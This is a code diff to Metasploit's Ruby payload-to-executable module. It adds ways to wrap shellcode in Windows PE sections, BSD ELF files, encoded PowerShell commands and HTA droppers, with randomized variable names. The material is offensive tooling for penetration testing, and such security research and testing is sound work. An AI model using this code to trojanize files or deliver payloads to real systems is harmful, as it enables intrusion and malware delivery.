@@ -15,9 +15,11 @@ require 'rex/peparsey'
 require 'rex/pescan'
 require 'rex/random_identifier_generator'
 require 'rex/zip'
+require 'rex/powershell'
 require 'metasm'
 require 'digest/sha1'
 require 'msf/core/exe/segment_injector'
+require 'msf/core/exe/segment_appender'
 
   ##
   #
@@ -110,6 +112,10 @@ require 'msf/core/exe/segment_injector'
       if plat.index(Msf::Module::Platform::OSX)
         return to_osx_x64_macho(framework, code)
       end
+
+      if plat.index(Msf::Module::Platform::BSD)
+        return to_bsd_x64_elf(framework, code)
+      end
     end
 
     if arch.index(ARCH_ARMLE)
@@ -182,11 +188,7 @@ require 'msf/core/exe/segment_injector'
     payload = win32_rwx_exec(code)
 
     # Create a new PE object and run through sanity checks
-    fsize = File.size(opts[:template])
     pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
-
-    text = nil
-    pe.sections.each {|sec| text = sec if sec.name == ".text"}
 
     #try to inject code into executable by adding a section without affecting executable behavior
     if opts[:inject]
@@ -198,6 +200,9 @@ require 'msf/core/exe/segment_injector'
       return injector.generate_pe
     end
 
+    text = nil
+    pe.sections.each {|sec| text = sec if sec.name == ".text"}
+
     raise RuntimeError, "No .text section found in the template" unless text
 
     unless text.contains_rva?(pe.hdr.opt.AddressOfEntryPoint)
@@ -205,12 +210,15 @@ require 'msf/core/exe/segment_injector'
     end
 
     p_length = payload.length + 256
+
+    # If the .text section is too small, append a new section instead
     if text.size < p_length
-      fname = ::File.basename(opts[:template])
-      msg  = "The .text section for '#{fname}' is too small. "
-      msg << "Minimum is #{p_length.to_s} bytes, your .text section is " +
-             "#{text.size.to_s} bytes"
-      raise RuntimeError, msg
+      appender = Msf::Exe::SegmentAppender.new({
+          :payload  => code,
+          :template => opts[:template],
+          :arch     => :x86
+      })
+      return appender.generate_pe
     end
 
     # Store some useful offsets
@@ -506,7 +514,8 @@ require 'msf/core/exe/segment_injector'
   def self.to_win64pe(framework, code, opts = {})
     # Allow the user to specify their own EXE template
     set_template_default(opts, "template_x64_windows.exe")
-    #try to inject code into executable by adding a section without affecting executable behavior
+
+    # Try to inject code into executable by adding a section without affecting executable behavior
     if opts[:inject]
       injector = Msf::Exe::SegmentInjector.new({
          :payload  => code,
@@ -515,8 +524,17 @@ require 'msf/core/exe/segment_injector'
       })
       return injector.generate_pe
     end
-    opts[:exe_type] = :exe_sub
-    exe_sub_method(code,opts)
+
+    #opts[:exe_type] = :exe_sub
+    #return exe_sub_method(code,opts)
+
+    # Append a new section instead
+    appender = Msf::Exe::SegmentAppender.new({
+      :payload  => code,
+      :template => opts[:template],
+      :arch     => :x64
+    })
+    return appender.generate_pe
   end
 
   # Embeds shellcode within a Windows PE file implementing the Windows
@@ -878,6 +896,11 @@ require 'msf/core/exe/segment_injector'
     to_exe_elf(framework, opts, "template_x86_bsd.bin", code)
   end
 
+  # Create a 64-bit Linux ELF containing the payload provided in +code+
+  def self.to_bsd_x64_elf(framework, code, opts = {})
+    to_exe_elf(framework, opts, "template_x64_bsd.bin", code)
+  end
+
   # Create a 32-bit Solaris ELF containing the payload provided in +code+
   def self.to_solaris_x86_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_x86_solaris.bin", code)
@@ -1058,36 +1081,17 @@ require 'msf/core/exe/segment_injector'
   end
 
   def self.to_win32pe_psh_net(framework, code, opts={})
-    rig = Rex::RandomIdentifierGenerator.new()
-    rig.init_var(:var_code)
-    rig.init_var(:var_kernel32)
-    rig.init_var(:var_baseaddr)
-    rig.init_var(:var_threadHandle)
-    rig.init_var(:var_output)
-    rig.init_var(:var_codeProvider)
-    rig.init_var(:var_compileParams)
-    rig.init_var(:var_syscode)
-    rig.init_var(:var_temp)
-
-    hash_sub = rig.to_h
-    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
-
-    read_replace_script_template("to_mem_dotnet.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+    template_path = File.join(Msf::Config.data_directory,
+                                  "templates",
+                                  "scripts")
+    Rex::Powershell::Payload.to_win32pe_psh_net(template_path, code)
   end
 
   def self.to_win32pe_psh(framework, code, opts = {})
-    hash_sub = {}
-    hash_sub[:var_code] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_win32_func]	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_payload] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_size] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_rwx] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_iter] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_syscode] 		= Rex::Text.rand_text_alpha(rand(8)+8)
-
-    hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
-
-    read_replace_script_template("to_mem_old.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+    template_path = File.join(Msf::Config.data_directory,
+                              "templates",
+                              "scripts")
+    Rex::Powershell::Payload.to_win32pe_psh(template_path, code)
   end
 
   #
@@ -1096,29 +1100,52 @@ require 'msf/core/exe/segment_injector'
   # Originally from PowerSploit
   #
   def self.to_win32pe_psh_reflection(framework, code, opts = {})
+    template_path = File.join(Msf::Config.data_directory,
+                              "templates",
+                              "scripts")
+    Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, code)
+  end
+
+  def self.to_powershell_command(framework, arch, code)
+    template_path = File.join(Msf::Config.data_directory,
+                              "templates",
+                              "scripts")
+    Rex::Powershell::Command.cmd_psh_payload(code,
+                    arch,
+                    template_path,
+                    encode_final_payload: true,
+                    method: 'reflection')
+  end
+
+  def self.to_powershell_hta(framework, arch, code)
+    template_path = File.join(Msf::Config.data_directory,
+                              "templates",
+                              "scripts")
+
+    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                    arch,
+                    template_path,
+                    encode_final_payload: true,
+                    remove_comspec: true,
+                    method: 'reflection')
+
     # Intialize rig and value names
     rig = Rex::RandomIdentifierGenerator.new()
-    rig.init_var(:func_get_proc_address)
-    rig.init_var(:func_get_delegate_type)
-    rig.init_var(:var_code)
-    rig.init_var(:var_module)
-    rig.init_var(:var_procedure)
-    rig.init_var(:var_unsafe_native_methods)
-    rig.init_var(:var_parameters)
-    rig.init_var(:var_return_type)
-    rig.init_var(:var_type_builder)
-    rig.init_var(:var_buffer)
-    rig.init_var(:var_hthread)
+    rig.init_var(:var_shell)
+    rig.init_var(:var_fso)
 
     hash_sub = rig.to_h
-    hash_sub[:b64shellcode] = Rex::Text.encode_base64(code)
+    hash_sub[:powershell] = powershell
 
-    read_replace_script_template("to_mem_pshreflection.ps1.template",
-                                  hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+    read_replace_script_template("to_powershell.hta.template", hash_sub)
   end
 
   def self.to_win32pe_vbs(framework, code, opts = {})
     to_exe_vbs(to_win32pe(framework, code, opts), opts)
+  end
+
+  def self.to_win64pe_vbs(framework, code, opts = {})
+    to_exe_vbs(to_win64pe(framework, code, opts), opts)
   end
 
   # Creates a jar file that drops the provided +exe+ into a random file name
@@ -1135,7 +1162,7 @@ require 'msf/core/exe/segment_injector'
     paths = [
       [ "metasploit", "Payload.class" ],
     ]
-    zip.add_files(paths, File.join(Msf::Config.data_directory, "java"))
+    zip.add_files(paths, MetasploitPayloads.path('java'))
     zip.build_manifest :main_class => "metasploit.Payload"
     config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
     zip.add_file("metasploit.dat", config)
@@ -1857,10 +1884,8 @@ require 'msf/core/exe/segment_injector'
       if !plat || plat.index(Msf::Module::Platform::Linux)
         case arch
         when ARCH_X86,nil
-to_linux_x86_elf(framework, code, exeopts)
-        when ARCH_X86_64
-          to_linux_x64_elf(framework, code, exeopts)
-        when ARCH_X64
+          to_linux_x86_elf(framework, code, exeopts)
+        when ARCH_X86_64, ARCH_X64
           to_linux_x64_elf(framework, code, exeopts)
         when ARCH_ARMLE
           to_linux_armle_elf(framework, code, exeopts)
@@ -1873,6 +1898,8 @@ to_linux_x86_elf(framework, code, exeopts)
         case arch
         when ARCH_X86,nil
           Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
+        when ARCH_X86_64, ARCH_X64
+          Msf::Util::EXE.to_bsd_x64_elf(framework, code, exeopts)
         end
       elsif plat && plat.index(Msf::Module::Platform::Solaris)
         case arch
@@ -1883,9 +1910,7 @@ to_linux_x86_elf(framework, code, exeopts)
     when 'elf-so'
       if !plat || plat.index(Msf::Module::Platform::Linux)
         case arch
-        when ARCH_X86_64
-          to_linux_x64_elf_dll(framework, code, exeopts)
-        when ARCH_X64
+        when ARCH_X86_64, ARCH_X64
           to_linux_x64_elf_dll(framework, code, exeopts)
         end
       end
@@ -1893,9 +1918,7 @@ to_linux_x86_elf(framework, code, exeopts)
       macho = case arch
       when ARCH_X86,nil
         to_osx_x86_macho(framework, code, exeopts)
-      when ARCH_X86_64
-        to_osx_x64_macho(framework, code, exeopts)
-      when ARCH_X64
+      when ARCH_X86_64, ARCH_X64
         to_osx_x64_macho(framework, code, exeopts)
       when ARCH_ARMLE
         to_osx_arm_macho(framework, code, exeopts)
@@ -1926,6 +1949,10 @@ to_linux_x86_elf(framework, code, exeopts)
       Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
     when 'psh-reflection'
       Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)
+    when 'psh-cmd'
+      Msf::Util::EXE.to_powershell_command(framework, arch, code)
+    when 'hta-psh'
+      Msf::Util::EXE.to_powershell_hta(framework, arch, code)
     end
   end
 
@@ -1941,6 +1968,7 @@ to_linux_x86_elf(framework, code, exeopts)
       "exe-only",
       "exe-service",
       "exe-small",
+      "hta-psh",
       "loop-vbs",
       "macho",
       "msi",
@@ -1949,6 +1977,7 @@ to_linux_x86_elf(framework, code, exeopts)
       "psh",
       "psh-net",
       "psh-reflection",
+      "psh-cmd",
       "vba",
       "vba-exe",
       "vbs",
